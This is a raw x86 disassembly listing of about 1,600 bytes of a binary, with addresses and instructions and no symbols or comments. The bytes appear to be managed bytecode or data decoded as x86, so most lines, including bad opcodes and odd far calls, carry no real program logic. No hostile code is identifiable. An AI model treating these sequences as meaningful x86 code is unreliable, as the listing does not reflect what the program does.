  402697:	add    al,0x6f
  402699:	pop    ds
  40269a:	add    BYTE PTR [eax],al
  40269c:	push   es
  40269d:	add    bh,dh
  40269f:	push   es
  4026a0:	pop    ss
  4026a1:	add    BYTE PTR [eax],al
  4026a3:	push   es
  4026a4:	jae    0x4026e8
  4026a6:	add    BYTE PTR [eax],al
  4026a8:	or     ch,BYTE PTR [edi+0x43]
  4026ab:	add    BYTE PTR [eax],al
  4026ad:	or     dh,BYTE PTR [edx-0x2d]
  4026b0:	or     DWORD PTR [eax],eax
  4026b2:	jo     0x4026dc
  4026b4:	sbb    DWORD PTR [eax],eax
  4026b6:	add    BYTE PTR [edx],cl
  4026b8:	add    ch,BYTE PTR [eax]
  4026ba:	adc    eax,0x2a060000
  4026bf:	jbe    0x4026c3
  4026c1:	jnp    0x4026c5
  4026c3:	add    BYTE PTR [eax],al
  4026c5:	add    al,0x6f
  4026c7:	das    
  4026c8:	add    BYTE PTR [eax],al
  4026ca:	push   es
  4026cb:	and    al,ch
  4026cd:	add    eax,DWORD PTR [eax]
  4026cf:	add    BYTE PTR [edx+0x28],bl
  4026d2:	inc    ebp
  4026d3:	add    BYTE PTR [eax],al
  4026d5:	or     al,BYTE PTR [edx]
  4026d7:	sub    BYTE PTR ds:0x2a060000,cl
  4026dd:	add    BYTE PTR [eax],al
  4026df:	add    BYTE PTR [ebx],dl
  4026e1:	xor    BYTE PTR [esi],al
  4026e3:	add    BYTE PTR [edx+0x9000000],bl
  4026e9:	add    BYTE PTR [eax],al
  4026eb:	adc    DWORD PTR [edx+ecx*1],edx
  4026ee:	add    bh,BYTE PTR [ebx+0x2]
  4026f1:	add    BYTE PTR [eax],al
  4026f3:	add    al,0x6f
  4026f5:	sbb    eax,0x39060000
  4026fa:	xchg   DWORD PTR [eax],eax
  4026fc:	add    BYTE PTR [eax],al
  4026fe:	jb     0x402743
  402700:	or     al,BYTE PTR [eax]
  402702:	jo     0x40272c
  402704:	sbb    DWORD PTR [eax],eax
  402706:	add    BYTE PTR [edx],cl
  402708:	add    al,BYTE PTR [edx]
  40270a:	jnp    0x40270e
  40270c:	add    BYTE PTR [eax],al
  40270e:	add    al,0x6f
  402710:	sub    eax,DWORD PTR [eax]
  402712:	add    BYTE PTR [esi],al
  402714:	add    bh,BYTE PTR [ebx+0x2]
  402717:	add    BYTE PTR [eax],al
  402719:	add    al,0x6f
  40271b:	sub    eax,0x2060000
  402720:	jnp    0x402724
  402722:	add    BYTE PTR [eax],al
  402724:	add    al,0x6f
  402726:	daa    
  402727:	add    BYTE PTR [eax],al
  402729:	push   es
  40272a:	add    bh,BYTE PTR [ebx+0x2]
  40272d:	add    BYTE PTR [eax],al
  40272f:	add    al,0x6f
  402731:	and    eax,0x2060000
  402736:	jnp    0x40273a
  402738:	add    BYTE PTR [eax],al
  40273a:	add    al,0x6f
  40273c:	sub    DWORD PTR [eax],eax
  40273e:	add    BYTE PTR [esi],al
  402740:	sub    BYTE PTR [edx],cl
  402742:	add    BYTE PTR [eax],al
  402744:	push   es
  402745:	add    bh,dh
  402747:	push   es
  402748:	push   ss
  402749:	add    BYTE PTR [eax],al
  40274b:	push   es
  40274c:	jae    0x402794
  40274e:	add    BYTE PTR [eax],al
  402750:	or     ch,BYTE PTR [eax]
  402752:	inc    edi
  402753:	add    BYTE PTR [eax],al
  402755:	or     dh,BYTE PTR [edx-0x6d]
  402758:	or     al,BYTE PTR [eax]
  40275a:	jo     0x402784
  40275c:	dec    eax
  40275d:	add    BYTE PTR [eax],al
  40275f:	or     al,BYTE PTR [edx]
  402761:	jnp    0x402765
  402763:	add    BYTE PTR [eax],al
  402765:	add    al,0x6f
  402767:	das    
  402768:	add    BYTE PTR [eax],al
  40276a:	push   es
  40276b:	push   ss
  40276c:	ss pop ss
  40276e:	push   es
  40276f:	sub    eax,0x6fe020d
  402774:	sbb    eax,DWORD PTR [eax]
  402776:	add    BYTE PTR [esi],al
  402778:	jae    0x4027c3
  40277a:	add    BYTE PTR [eax],al
  40277c:	or     cl,BYTE PTR [edx]
  40277e:	push   es
  40277f:	sub    BYTE PTR [edx+0x0],cl
  402782:	add    BYTE PTR [edx],cl
  402784:	sub    al,BYTE PTR es:[esi+0x72]
  402788:	lds    ecx,FWORD PTR [edx]
  40278a:	add    BYTE PTR [eax+0x28],dh
  40278d:	sbb    DWORD PTR [eax],eax
  40278f:	add    BYTE PTR [edx],cl
  402791:	add    ch,BYTE PTR [eax]
  402793:	or     eax,0x2a060000
  402798:	push   ds
  402799:	add    ch,BYTE PTR [eax]
  40279b:	or     eax,0x2a060000
  4027a0:	or     dl,BYTE PTR [edx+ebp*1]
  4027a3:	add    BYTE PTR [ebx],bl
  4027a5:	xor    BYTE PTR [eax+eax*1],al
  4027a8:	xchg   edi,eax
  4027a9:	add    BYTE PTR [eax],al
  4027ab:	add    BYTE PTR [edx],cl
  4027ad:	add    BYTE PTR [eax],al
  4027af:	adc    DWORD PTR [ebx],eax
  4027b1:	cmp    DWORD PTR [eax+0x72000000],edx
  4027b7:	ud2    
  4027b9:	add    BYTE PTR [eax+0x17],dh
  4027bc:	lea    eax,[ecx]
  4027be:	add    BYTE PTR [eax],al
  4027c0:	add    DWORD PTR [ebx],ecx
  4027c2:	pop    es
  4027c3:	push   ss
  4027c4:	add    ecx,DWORD PTR [eax+esi*1-0x5dff0000]
  4027cb:	pop    es
  4027cc:	sub    BYTE PTR [ecx],dh
  4027ce:	add    BYTE PTR [eax],al
  4027d0:	or     al,BYTE PTR [edx]
  4027d2:	jnp    0x4027d6
  4027d4:	add    BYTE PTR [eax],al
  4027d6:	add    al,0x6f
  4027d8:	sbb    eax,0x2c060000
  4027dd:	adc    dh,BYTE PTR [edx-0x73]
  4027e0:	or     eax,DWORD PTR [eax]
  4027e2:	jo     0x4027e7
  4027e4:	mov    WORD PTR [eax],?
  4027e6:	add    BYTE PTR [eax],al
  4027e8:	add    DWORD PTR [eax],ebp
  4027ea:	dec    ebx
  4027eb:	add    BYTE PTR [eax],al
  4027ed:	or     ch,BYTE PTR [ebx]
  4027ef:	inc    edi
  4027f0:	add    bh,BYTE PTR [ebx+0x8]
  4027f3:	add    BYTE PTR [eax],al
  4027f5:	add    al,0x2
  4027f7:	jnp    0x4027fb
  4027f9:	add    BYTE PTR [eax],al
  4027fb:	add    al,0x6f
  4027fd:	and    DWORD PTR [eax],eax
  4027ff:	add    BYTE PTR [esi],al
  402801:	add    al,BYTE PTR [ebx]
  402803:	outs   dx,DWORD PTR ds:[esi]
  402804:	push   es
  402805:	add    BYTE PTR [eax],al
  402807:	push   es
  402808:	fisubr WORD PTR ds:0xbff720a
  40280e:	add    BYTE PTR [eax+0x18],dh
  402811:	lea    eax,[ecx]
  402813:	add    BYTE PTR [eax],al
  402815:	add    DWORD PTR [eax+ecx*1],ecx
  402818:	push   ss
  402819:	push   es
  40281a:	mov    ds:0x7b021708,al
  40281f:	add    al,BYTE PTR [eax]
  402821:	add    BYTE PTR [edi+ebp*2],al
  402824:	and    DWORD PTR [eax],eax
  402826:	add    BYTE PTR [esi],al
  402828:	mov    ds:0x312808,al
  40282d:	add    BYTE PTR [edx],cl
  40282f:	pop    ss
  402830:	sub    BYTE PTR [edx],dh
  402832:	add    BYTE PTR [eax],al
  402834:	or     bl,dh
  402836:	add    dh,bl
  402838:	or     eax,0x57b02
  40283d:	add    BYTE PTR [edi+ebp*2],al
  402840:	sub    DWORD PTR [eax],eax
  402842:	add    BYTE PTR [edx],cl
  402844:	fsubr  QWORD PTR es:[edx]
  402847:	add    BYTE PTR [ecx],al
  402849:	sbb    al,0x0
  40284b:	add    BYTE PTR [eax],al
  40284d:	add    BYTE PTR [eax+0x0],al
  402850:	sbb    bl,BYTE PTR [edx+0x0]
  402853:	sub    eax,0x1000032
  402858:	add    al,BYTE PTR [eax]
  40285a:	push   es
  40285b:	add    BYTE PTR [ebx+0xd0089],al
  402861:	add    BYTE PTR [eax],al
  402863:	add    dh,dl
  402865:	add    dh,BYTE PTR [ebx+0x1c]
  402868:	add    BYTE PTR [eax],al
  40286a:	push   es
  40286b:	jge    0x40286f
  40286d:	add    BYTE PTR [eax],al
  40286f:	add    al,0x2
  402871:	push   ss
  402872:	jae    0x4028a1
  402874:	add    BYTE PTR [eax],al
  402876:	or     bh,BYTE PTR [ebp+0x4]
  402879:	add    BYTE PTR [eax],al
  40287b:	add    al,0x2
  40287d:	push   ss
  40287e:	jae    0x4028ad
  402880:	add    BYTE PTR [eax],al
  402882:	or     bh,BYTE PTR [ebp+0x5]
  402885:	add    BYTE PTR [eax],al
  402887:	add    al,0x2
  402889:	jae    0x4028ad
  40288b:	add    BYTE PTR [eax],al
  40288d:	or     bh,BYTE PTR [ebp+0x7]
  402890:	add    BYTE PTR [eax],al
  402892:	add    al,0x2
  402894:	sub    BYTE PTR [eax+eax*1+0x0],cl
  402898:	or     ch,BYTE PTR [edx]
  40289a:	add    BYTE PTR [eax],al
  40289c:	add    esi,DWORD PTR [eax]
  40289e:	add    al,BYTE PTR [eax]
  4028a0:	inc    esi
  4028a1:	add    BYTE PTR [eax],al
  4028a3:	add    BYTE PTR [eax],al
  4028a5:	add    BYTE PTR [eax],al
  4028a7:	add    BYTE PTR [edx],al
  4028a9:	sub    BYTE PTR [edx],ah
  4028ab:	add    BYTE PTR [eax],al
  4028ad:	or     al,BYTE PTR [edx]
  4028af:	pop    ss
  4028b0:	sub    BYTE PTR [esi],bl
  4028b2:	add    BYTE PTR [eax],al
  4028b4:	push   es
  4028b5:	add    ah,BYTE PTR [eax]
  4028b7:	add    BYTE PTR [edx],al
  4028b9:	add    BYTE PTR [eax],al
  4028bb:	sub    BYTE PTR [eax+eax*1],ch
  4028be:	add    BYTE PTR [esi],al
  4028c0:	add    bl,BYTE PTR [ebx]
  4028c2:	sub    BYTE PTR [esi],ch
  4028c4:	add    BYTE PTR [eax],al
  4028c6:	push   es
  4028c7:	add    dl,BYTE PTR [edi]
  4028c9:	sub    BYTE PTR [eax],ch
  4028cb:	add    BYTE PTR [eax],al
  4028cd:	push   es
  4028ce:	add    dl,BYTE PTR [edi]
  4028d0:	sub    BYTE PTR [esi],ah
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	push   es
  4028d5:	add    dl,BYTE PTR [esi]
  4028d7:	sub    BYTE PTR [eax],dh
  4028d9:	add    BYTE PTR [eax],al
  4028db:	push   es
  4028dc:	add    dh,BYTE PTR [edx+0x5f]
  4028df:	or     al,0x0
  4028e1:	jo     0x40290b
  4028e3:	sub    al,BYTE PTR [eax]
  4028e5:	add    BYTE PTR [esi],al
  4028e7:	add    ch,BYTE PTR [eax]
  4028e9:	xor    eax,DWORD PTR [eax]
  4028eb:	add    BYTE PTR [esi],al
  4028ed:	sub    bl,BYTE PTR [esi]
  4028ef:	add    bh,BYTE PTR [ebx+0xd]
  4028f2:	add    BYTE PTR [eax],al
  4028f4:	add    al,0x2a
  4028f6:	and    al,BYTE PTR [edx]
  4028f8:	add    edi,DWORD PTR [ebp+0xd]
  4028fb:	add    BYTE PTR [eax],al
  4028fd:	add    al,0x2a
  4028ff:	push   ds
  402900:	add    bh,BYTE PTR [ebx+0xe]
  402903:	add    BYTE PTR [eax],al
  402905:	add    al,0x2a
  402907:	and    al,BYTE PTR [edx]
  402909:	add    edi,DWORD PTR [ebp+0xe]
  40290c:	add    BYTE PTR [eax],al
  40290e:	add    al,0x2a
  402910:	push   ds
  402911:	add    bh,BYTE PTR [ebx+0xf]
  402914:	add    BYTE PTR [eax],al
  402916:	add    al,0x2a
  402918:	and    al,BYTE PTR [edx]
  40291a:	add    edi,DWORD PTR [ebp+0xf]
  40291d:	add    BYTE PTR [eax],al
  40291f:	add    al,0x2a
  402921:	push   ds
  402922:	add    bh,BYTE PTR [ebx+0x10]
  402925:	add    BYTE PTR [eax],al
  402927:	add    al,0x2a
  402929:	and    al,BYTE PTR [edx]
  40292b:	add    edi,DWORD PTR [ebp+0x10]
  40292e:	add    BYTE PTR [eax],al
  402930:	add    al,0x2a
  402932:	push   ds
  402933:	add    bh,BYTE PTR [ebx+0x11]
  402936:	add    BYTE PTR [eax],al
  402938:	add    al,0x2a
  40293a:	and    al,BYTE PTR [edx]
  40293c:	add    edi,DWORD PTR [ebp+0x11]
  40293f:	add    BYTE PTR [eax],al
  402941:	add    al,0x2a
  402943:	push   ds
  402944:	add    bh,BYTE PTR [ebx+0x12]
  402947:	add    BYTE PTR [eax],al
  402949:	add    al,0x2a
  40294b:	and    al,BYTE PTR [edx]
  40294d:	add    edi,DWORD PTR [ebp+0x12]
  402950:	add    BYTE PTR [eax],al
  402952:	add    al,0x2a
  402954:	push   ds
  402955:	add    bh,BYTE PTR [ebx+0x13]
  402958:	add    BYTE PTR [eax],al
  40295a:	add    al,0x2a
  40295c:	and    al,BYTE PTR [edx]
  40295e:	add    edi,DWORD PTR [ebp+0x13]
  402961:	add    BYTE PTR [eax],al
  402963:	add    al,0x2a
  402965:	push   ds
  402966:	add    bh,BYTE PTR [ebx+0x14]
  402969:	add    BYTE PTR [eax],al
  40296b:	add    al,0x2a
  40296d:	and    al,BYTE PTR [edx]
  40296f:	add    edi,DWORD PTR [ebp+0x14]
  402972:	add    BYTE PTR [eax],al
  402974:	add    al,0x2a
  402976:	push   ds
  402977:	add    bh,BYTE PTR [ebx+0x15]
  40297a:	add    BYTE PTR [eax],al
  40297c:	add    al,0x2a
  40297e:	and    al,BYTE PTR [edx]
  402980:	add    edi,DWORD PTR [ebp+0x15]
  402983:	add    BYTE PTR [eax],al
  402985:	add    al,0x2a
  402987:	push   ds
  402988:	add    bh,BYTE PTR [ebx+0x16]
  40298b:	add    BYTE PTR [eax],al
  40298d:	add    al,0x2a
  40298f:	and    al,BYTE PTR [edx]
  402991:	add    edi,DWORD PTR [ebp+0x16]
  402994:	add    BYTE PTR [eax],al
  402996:	add    al,0x2a
  402998:	adc    esi,DWORD PTR [eax]
  40299a:	push   es
  40299b:	add    ch,dh
  40299d:	add    al,BYTE PTR [eax]
  40299f:	add    BYTE PTR [ebx],cl
  4029a1:	add    BYTE PTR [eax],al
  4029a3:	adc    DWORD PTR [edi],edx
  4029a5:	or     dh,BYTE PTR [ebx+0x4d]
  4029a8:	add    BYTE PTR [eax],al
  4029aa:	or     cl,BYTE PTR [ebx]
  4029ac:	push   ss
  4029ad:	or     al,0x38
  4029af:	int3   
  4029b0:	add    al,BYTE PTR [eax]
  4029b2:	add    BYTE PTR [ebx],al
  4029b4:	or     BYTE PTR [edx+0xc8372],bl
  4029ba:	jo     0x4029d7
  4029bc:	sub    BYTE PTR [esi+0x0],cl
  4029bf:	add    BYTE PTR [edx],cl
  4029c1:	sub    al,0x61
  4029c3:	add    dl,BYTE PTR [esi]
  4029c5:	sub    BYTE PTR [esi],bl
  4029c7:	add    BYTE PTR [eax],al
  4029c9:	push   es
  4029ca:	or     BYTE PTR [edi],dl
  4029cc:	pop    eax
  4029cd:	or     al,0x15
  4029cf:	or     eax,0x698e0308
  4029d4:	das    
  4029d5:	sbb    BYTE PTR [ebx],al
  4029d7:	or     BYTE PTR [edx+0x4f280312],bl
  4029dd:	add    BYTE PTR [eax],al
  4029df:	or     ch,BYTE PTR [esp+ecx*1]
  4029e2:	add    cl,BYTE PTR [ecx]
  4029e4:	sub    BYTE PTR [eax+0x0],dl
  4029e7:	add    BYTE PTR [edx],cl
  4029e9:	sub    BYTE PTR [eax],ah
  4029eb:	add    BYTE PTR [eax],al
  4029ed:	push   es
  4029ee:	add    ch,BYTE PTR [eax]
  4029f0:	pop    ds
  4029f1:	add    BYTE PTR [eax],al
  4029f3:	push   es
  4029f4:	cmp    al,BYTE PTR [edx+0x7000002]
  4029fa:	jb     0x4029a1
  4029fc:	or     al,0x0
  4029fe:	jo     0x402a17
  402a00:	lea    eax,[ecx]
  402a02:	add    BYTE PTR [eax],al
  402a04:	add    DWORD PTR [ebx],edx
  402a06:	or     DWORD PTR [ecx],edx
  402a08:	or     DWORD PTR [esi],edx
  402a0a:	or     DWORD PTR [eax+esi*1-0x5dff0000],ecx
  402a11:	adc    DWORD PTR [ecx],ecx
  402a13:	sub    BYTE PTR [edx],dh
  402a15:	add    BYTE PTR [eax],al
  402a17:	push   es
  402a18:	outs   dx,DWORD PTR ds:[esi]
  402a19:	push   ecx
  402a1a:	add    BYTE PTR [eax],al
  402a1c:	or     dl,BYTE PTR [esi]
  402a1e:	or     bh,BYTE PTR [eax]
  402a20:	push   edi
  402a21:	add    al,BYTE PTR [eax]
  402a23:	add    BYTE PTR [ebx],al
  402a25:	or     BYTE PTR [edx+0xce172],bl
  402a2b:	jo     0x402a48
  402a2d:	sub    BYTE PTR [esi+0x0],cl
  402a30:	add    BYTE PTR [edx],cl
  402a32:	sub    al,0x4e
  402a34:	or     BYTE PTR [edi],dl
  402a36:	pop    eax
  402a37:	or     al,0x8
  402a39:	add    ecx,DWORD PTR [esi+0x2092f69]
  402a3f:	add    ecx,DWORD PTR [eax]
  402a41:	call   0x206:0x2228
  402a48:	sub    BYTE PTR [ecx],ah
  402a4a:	add    BYTE PTR [eax],al
  402a4c:	push   es
  402a4d:	sub    BYTE PTR [eax+eax*1],ah
  402a50:	add    BYTE PTR [edx],cl
  402a52:	cmp    DWORD PTR [edx+eax*1],esp
  402a55:	add    BYTE PTR [eax],al
  402a57:	pop    es
  402a58:	jb     0x402a5d
  402a5a:	or     eax,0x8d177000
  402a5f:	add    DWORD PTR [eax],eax
  402a61:	add    BYTE PTR [ecx],al
  402a63:	adc    ecx,DWORD PTR [edx]
  402a65:	adc    DWORD PTR [edx],ecx
  402a67:	push   ss
  402a68:	add    ch,BYTE PTR [eax]
  402a6a:	and    DWORD PTR [eax],eax
  402a6c:	add    BYTE PTR [esi],al
  402a6e:	mov    ds:0x32280a11,al
  402a73:	add    BYTE PTR [eax],al
  402a75:	push   es
  402a76:	outs   dx,DWORD PTR ds:[esi]
  402a77:	push   ecx
  402a78:	add    BYTE PTR [eax],al
  402a7a:	or     dl,BYTE PTR [esi]
  402a7c:	or     bh,BYTE PTR [eax]
  402a7e:	stc    
  402a7f:	add    DWORD PTR [eax],eax
  402a81:	add    BYTE PTR [ebx],al
  402a83:	or     BYTE PTR [edx+0xd3d72],bl
  402a89:	jo     0x402aa6
  402a8b:	sub    BYTE PTR [esi+0x0],cl
  402a8e:	add    BYTE PTR [edx],cl
  402a90:	sub    al,0x4e
  402a92:	or     BYTE PTR [edi],dl
  402a94:	pop    eax
  402a95:	or     al,0x8
  402a97:	add    ecx,DWORD PTR [esi+0x2092f69]
  402a9d:	add    ecx,DWORD PTR [eax]
  402a9f:	call   0x206:0x2428
  402aa6:	sub    BYTE PTR [ebx],ah
  402aa8:	add    BYTE PTR [eax],al
  402aaa:	push   es
  402aab:	sub    BYTE PTR [eax+eax*1],ah
  402aae:	add    BYTE PTR [edx],cl
  402ab0:	cmp    esi,eax
  402ab2:	add    DWORD PTR [eax],eax
  402ab4:	add    BYTE PTR [edi],al
  402ab6:	jb     0x402b1b
  402ab8:	or     eax,0x8d177000
  402abd:	add    DWORD PTR [eax],eax
  402abf:	add    BYTE PTR [ecx],al
  402ac1:	adc    ecx,DWORD PTR [ebx]
  402ac3:	adc    DWORD PTR [ebx],ecx
  402ac5:	push   ss
  402ac6:	add    ch,BYTE PTR [eax]
  402ac8:	and    eax,DWORD PTR [eax]
  402aca:	add    BYTE PTR [esi],al
  402acc:	mov    ds:0x32280b11,al
  402ad1:	add    BYTE PTR [eax],al
  402ad3:	push   es
  402ad4:	outs   dx,DWORD PTR ds:[esi]
  402ad5:	push   ecx
  402ad6:	add    BYTE PTR [eax],al
  402ad8:	or     dl,BYTE PTR [esi]
  402ada:	or     bh,BYTE PTR [eax]
  402adc:	fwait
  402add:	add    DWORD PTR [eax],eax
  402adf:	add    BYTE PTR [ebx],al
  402ae1:	or     BYTE PTR [edx+0xda172],bl
  402ae7:	jo     0x402b04
  402ae9:	sub    BYTE PTR [esi+0x0],cl
  402aec:	add    BYTE PTR [edx],cl
  402aee:	sub    eax,0x9a080310
  402af3:	jb     0x402a9c
  402af5:	or     eax,0x281b7000
  402afa:	dec    esi
  402afb:	add    BYTE PTR [eax],al
  402afd:	or     ch,BYTE PTR [esp+ebx*2]
  402b00:	sub    BYTE PTR [edx+0x0],dl
  402b03:	add    BYTE PTR [edx],cl
  402b05:	outs   dx,DWORD PTR ds:[esi]
  402b06:	push   ebx
  402b07:	add    BYTE PTR [eax],al
  402b09:	or     dl,BYTE PTR [ebx]
  402b0b:	add    al,0x11
  402b0d:	add    al,0x28
  402b0f:	push   esp
  402b10:	add    BYTE PTR [eax],al
  402b12:	or     dl,BYTE PTR [ebx]
  402b14:	add    eax,0x552807
  402b19:	add    BYTE PTR [edx],cl
  402b1b:	sub    BYTE PTR [ebx+0x0],cl
  402b1e:	add    BYTE PTR [esi],al
  402b20:	pop    ss
  402b21:	lea    eax,[ecx]
  402b23:	add    BYTE PTR [eax],al
  402b25:	add    DWORD PTR [ebx],edx
  402b27:	or     al,0x11
  402b29:	or     al,0x16
  402b2b:	adc    DWORD PTR ds:0x566f,eax
  402b31:	or     ah,BYTE PTR [edx+0x1d280c11]
  402b37:	add    BYTE PTR [eax],al
  402b39:	or     ch,BYTE PTR [edi+0x51]
  402b3c:	add    BYTE PTR [eax],al
  402b3e:	or     al,BYTE PTR [edi]
  402b40:	sub    BYTE PTR [ebp+0x0],dl
  402b43:	add    BYTE PTR [edx],cl
  402b45:	sub    BYTE PTR [eax+0x0],dl
  402b48:	add    BYTE PTR [esi],al
  402b4a:	push   ss
  402b4b:	lea    eax,[ecx]
  402b4d:	add    BYTE PTR [eax],al
  402b4f:	add    DWORD PTR [eax],ebp
  402b51:	sbb    eax,0x6f0a0000
  402b56:	push   ecx
  402b57:	add    BYTE PTR [eax],al
  402b59:	or     dl,BYTE PTR [esi]
  402b5b:	or     al,BYTE PTR [ebx]
  402b5d:	or     BYTE PTR [edx+0xdad72],bl
  402b63:	jo     0x402b80
  402b65:	sub    BYTE PTR [esi+0x0],cl
  402b68:	add    BYTE PTR [edx],cl
  402b6a:	sub    al,0xc
  402b6c:	add    dl,BYTE PTR [esi]
  402b6e:	sub    BYTE PTR [eax],ch
  402b70:	add    BYTE PTR [eax],al
  402b72:	push   es
  402b73:	cmp    BYTE PTR [ebx],al
  402b75:	add    DWORD PTR [eax],eax
  402b77:	add    BYTE PTR [ebx],al
  402b79:	or     BYTE PTR [edx+0xdbf72],bl
  402b7f:	jo     0x402b9c
  402b81:	sub    BYTE PTR [esi+0x0],cl
  402b84:	add    BYTE PTR [edx],cl
  402b86:	sub    al,0xc
  402b88:	add    dl,BYTE PTR [esi]
  402b8a:	sub    BYTE PTR [esi],ah
  402b8c:	add    BYTE PTR [eax],al
  402b8e:	push   es
  402b8f:	cmp    bh,ah
  402b91:	add    BYTE PTR [eax],al
  402b93:	add    BYTE PTR [ebx],al
  402b95:	or     BYTE PTR [edx+0xdd172],bl
  402b9b:	jo     0x402bb8
  402b9d:	sub    BYTE PTR [esi+0x0],cl
  402ba0:	add    BYTE PTR [edx],cl
  402ba2:	sub    al,0x40
  402ba4:	or     BYTE PTR [edi],dl
  402ba6:	pop    eax
  402ba7:	or     al,0x8
  402ba9:	add    ecx,DWORD PTR [esi+0x2092f69]
  402baf:	add    ecx,DWORD PTR [eax]
  402bb1:	call   0x206:0x2a28
  402bb8:	sub    BYTE PTR [ecx],ch
  402bba:	add    BYTE PTR [eax],al
  402bbc:	push   es
  402bbd:	sub    BYTE PTR [eax+eax*1],ah
  402bc0:	add    BYTE PTR [edx],cl
  402bc2:	cmp    DWORD PTR [eax+eax*1+0x72070000],esi
  402bc9:	icebp  
  402bca:	or     eax,0x8d167000
  402bcf:	add    DWORD PTR [eax],eax
  402bd1:	add    BYTE PTR [ecx],al
  402bd3:	sub    BYTE PTR [edx],dh
  402bd5:	add    BYTE PTR [eax],al
  402bd7:	push   es
  402bd8:	outs   dx,DWORD PTR ds:[esi]
  402bd9:	push   ecx
  402bda:	add    BYTE PTR [eax],al
  402bdc:	or     dl,BYTE PTR [esi]
  402bde:	or     bh,BYTE PTR [eax]
  402be0:	xchg   edi,eax
  402be1:	add    BYTE PTR [eax],al
  402be3:	add    BYTE PTR [ebx],al
  402be5:	or     BYTE PTR [edx+0xe5f72],bl
  402beb:	jo     0x402c08
  402bed:	sub    BYTE PTR [esi+0x0],cl
  402bf0:	add    BYTE PTR [edx],cl
  402bf2:	sub    al,0x23
  402bf4:	or     BYTE PTR [edi],dl
  402bf6:	pop    eax
  402bf7:	or     al,0x8
  402bf9:	add    ecx,DWORD PTR [esi+0x14033269]
  402bff:	sub    eax,DWORD PTR [ebx]
  402c01:	add    ecx,DWORD PTR [eax]
  402c03:	call   0xe71:0x72020613
  402c0a:	add    BYTE PTR [eax+0x11],dh
  402c0d:	push   es
  402c0e:	pop    es
  402c0f:	sub    BYTE PTR [eax+eax*1],dh
  402c12:	add    BYTE PTR [esi],al
  402c14:	or     ch,BYTE PTR [ebx]
  402c16:	add    ecx,DWORD PTR fs:[eax]
  402c19:	call   0x1b70:0xe8172
  402c20:	sub    BYTE PTR [esi+0x0],cl
  402c23:	add    BYTE PTR [edx],cl
  402c25:	sub    al,0x23
  402c27:	or     BYTE PTR [edi],dl
  402c29:	pop    eax
  402c2a:	or     al,0x8
  402c2c:	add    ecx,DWORD PTR [esi+0x14033269]
  402c32:	sub    eax,DWORD PTR [ebx]
  402c34:	add    ecx,DWORD PTR [eax]
  402c36:	call   0xe97:0x72020713
  402c3d:	add    BYTE PTR [eax+0x11],dh
  402c40:	pop    es
  402c41:	pop    es
  402c42:	sub    BYTE PTR [eax+eax*1],dh
  402c45:	add    BYTE PTR [esi],al
  402c47:	or     ch,BYTE PTR [ebx]
  402c49:	xor    DWORD PTR [ebx],eax
  402c4b:	or     BYTE PTR [edx+0xeab72],bl
  402c51:	jo     0x402c6e
  402c53:	sub    BYTE PTR [esi+0x0],cl
  402c56:	add    BYTE PTR [edx],cl
  402c58:	sub    al,0x21
  402c5a:	or     BYTE PTR [edi],dl
  402c5c:	pop    eax
  402c5d:	or     al,0x8
  402c5f:	add    ecx,DWORD PTR [esi+0x14033269]
  402c65:	sub    eax,DWORD PTR [ebx]
  402c67:	add    ecx,DWORD PTR [eax]
  402c69:	call   0xebf:0x72020813
  402c70:	add    BYTE PTR [eax+0x11],dh
  402c73:	or     BYTE PTR [edi],al
  402c75:	sub    BYTE PTR [eax+eax*1],dh
  402c78:	add    BYTE PTR [esi],al
  402c7a:	or     cl,BYTE PTR [eax]
  402c7c:	pop    ss
  402c7d:	pop    eax
  402c7e:	or     al,0x8
  402c80:	add    ecx,DWORD PTR [esi-0x2d4c097]
  402c86:	(bad)  
  402c87:	inc    DWORD PTR [edx]
  402c89:	pop    es
  402c8a:	sub    BYTE PTR [esi],dh
  402c8c:	add    BYTE PTR [eax],al
  402c8e:	push   es
  402c8f:	push   es
  402c90:	sub    eax,0x32281506
  402c95:	add    BYTE PTR [eax],al
  402c97:	or     ch,BYTE PTR [edx]
  402c99:	sub    BYTE PTR ss:[ebx],bl
  402c9c:	add    BYTE PTR [eax],al
  402c9e:	or     al,BYTE PTR [edx]
  402ca0:	add    ebp,DWORD PTR [eax]
  402ca2:	sbb    eax,0x2a0a0000
  402ca7:	add    BYTE PTR [ebx],dl
  402ca9:	xor    BYTE PTR ds:0xc800,al
  402caf:	add    BYTE PTR [eax+eax*1],cl
  402cb2:	add    BYTE PTR [ecx],dl
  402cb4:	sub    BYTE PTR [edi+0x0],dl
  402cb7:	add    BYTE PTR [edx],cl
  402cb9:	jb     0x402d2c
  402cbb:	push   cs
  402cbc:	add    BYTE PTR [eax+0x6f],dh
  402cbf:	pop    eax
  402cc0:	add    BYTE PTR [eax],al
  402cc2:	or     cl,BYTE PTR [edx]
  402cc4:	sub    BYTE PTR [edi+0x0],dl
  402cc7:	add    BYTE PTR [edx],cl
  402cc9:	jb     0x402c62
  402ccb:	push   cs
  402ccc:	add    BYTE PTR [eax+0x6f],dh
  402ccf:	pop    eax
  402cd0:	add    BYTE PTR [eax],al
  402cd2:	or     cl,BYTE PTR [ebx]
  402cd4:	sub    BYTE PTR [edi+0x0],dl
  402cd7:	add    BYTE PTR [edx],cl
  402cd9:	jb     0x402c9a
  402cdb:	push   cs
  402cdc:	add    BYTE PTR [eax+0x6f],dh
  402cdf:	pop    eax
  402ce0:	add    BYTE PTR [eax],al
  402ce2:	or     cl,BYTE PTR [eax+ebp*1]
  402ce5:	push   edi
  402ce6:	add    BYTE PTR [eax],al
  402ce8:	or     dh,BYTE PTR [edx-0x2f]
  402ceb:	push   cs
  402cec:	add    BYTE PTR [eax+0x6f],dh
  402cef:	pop    eax
  402cf0:	add    BYTE PTR [eax],al
  402cf2:	or     cl,BYTE PTR ds:0x4d73
  402cf8:	or     dl,BYTE PTR [ebx]
  402cfa:	add    eax,0x6061317
  402cff:	sub    BYTE PTR [eax+eax*1],ah
  402d02:	add    BYTE PTR [edx],cl
  402d04:	sub    eax,0x2061113
  402d09:	jb     0x402d7c
  402d0b:	push   cs
  402d0c:	add    BYTE PTR [eax+0x6],dh
  402d0f:	adc    DWORD PTR ds:0x3428,eax
  402d15:	push   es
  402d16:	pop    edi
  402d17:	adc    eax,DWORD PTR [esi]
  402d19:	pop    es
  402d1a:	sub    BYTE PTR [eax+eax*1],ah
  402d1d:	add    BYTE PTR [edx],cl
  402d1f:	sub    eax,0x2061113
  402d24:	jb     0x402cbd
  402d26:	push   cs
  402d27:	add    BYTE PTR [eax+0x7],dh
  402d2a:	adc    DWORD PTR ds:0x3428,eax
  402d30:	push   es
  402d31:	pop    edi
  402d32:	adc    eax,DWORD PTR [esi]
